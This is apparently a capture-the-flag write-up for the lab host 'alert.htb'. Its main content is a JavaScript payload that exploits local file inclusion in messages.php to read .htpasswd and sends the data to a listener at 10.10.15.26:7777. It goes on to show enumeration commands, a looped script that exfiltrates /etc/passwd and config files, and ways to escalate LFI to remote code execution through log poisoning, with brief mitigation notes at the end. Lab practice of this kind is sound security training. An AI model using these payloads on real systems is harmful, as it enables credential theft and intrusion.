# Local File Inclusion (LFI) vulnerability. 

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.15.26:7777/?file_content=" + encodeURIComponent(data));
  });
</script>

```

This script is designed to exploit a **Local File Inclusion (LFI) vulnerability** in `messages.php` on `alert.htb`. Here's what it does:

# **Breakdown of the Script:**
```javascript
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
```
- This sends a request to `messages.php`, passing the `file` parameter.
- The `file` parameter attempts to access the `.htpasswd` file using **directory traversal (`../` sequences)** to move up in the directory tree.
- If `messages.php` does not properly validate input, it will include and return the contents of `.htpasswd`.

```javascript
.then(response => response.text())
.then(data => {
  fetch("http://10.10.15.26:7777/?file_content=" + encodeURIComponent(data));
});
```
- It takes the response (the content of `.htpasswd`).
- Then, it sends the extracted data to a listener on `10.10.15.26:7777`, which could be an attacker's machine set up to receive it.

---

# **How to Get `messages.php` and Understand Its Functionality**
1. **Enumerate the Web Server**
   - Use tools like `gobuster`, `ffuf`, or `dirsearch` to find `messages.php`:
     ```bash
     gobuster dir -u http://alert.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
     ```
   - Look for PHP files that take parameters.

2. **Test for LFI**
   - Manually try injecting `../` to see if files can be accessed:
     ```
     http://alert.htb/messages.php?file=../../../../../../../etc/passwd
     ```
   - If successful, you will see system user information.

3. **Understand What `messages.php` Does**
   - If you can access `.php` source files, look at how `messages.php` handles the `file` parameter:
     ```php
     <?php
     $file = $_GET['file'];
     include($file);
     ?>
     ```
   - If there is no proper validation (e.g., `realpath()`, `basename()`, `str_replace('../', '', $file)`), then it's vulnerable.

---

# **Customizing the Exploit for Future Use**
1. **Change the Target File**
   - Instead of `.htpasswd`, you can try:
     - `/etc/passwd` (user accounts)
     - `/var/www/html/config.php` (database credentials)
     - `/proc/self/environ` (environment variables, possible RCE)

2. **Automate Extraction**
   - Modify the script to loop through different files:
     ```javascript
     let files = [
       "../../../../../../../etc/passwd",
       "../../../../../../../var/www/html/config.php"
     ];

     files.forEach(file => {
       fetch(`http://alert.htb/messages.php?file=${file}`)
         .then(response => response.text())
         .then(data => {
           fetch("http://10.10.15.26:7777/?file=" + encodeURIComponent(file) + "&content=" + encodeURIComponent(data));
         });
     });
     ```

3. **Change Data Exfiltration**
   - Instead of sending data via `fetch()`, use:
     - WebSocket for real-time exfiltration.
     - Convert the response into Base64 before sending.

4. **Turn LFI into RCE**
   - If `/proc/self/environ` is accessible, try injecting a web shell by modifying `User-Agent`.
   - If LFI includes logs (`/var/log/apache2/access.log`), inject PHP payloads into logs and include them.

---

# **Detection & Mitigation**
- **Prevent LFI**
  - Use `realpath()`, `basename()`, or a whitelist of files.
  - Disable `allow_url_include` in `php.ini`.

- **Monitor Logs**
  - Check for excessive `../` sequences in requests.
  - Log unusual outgoing connections.

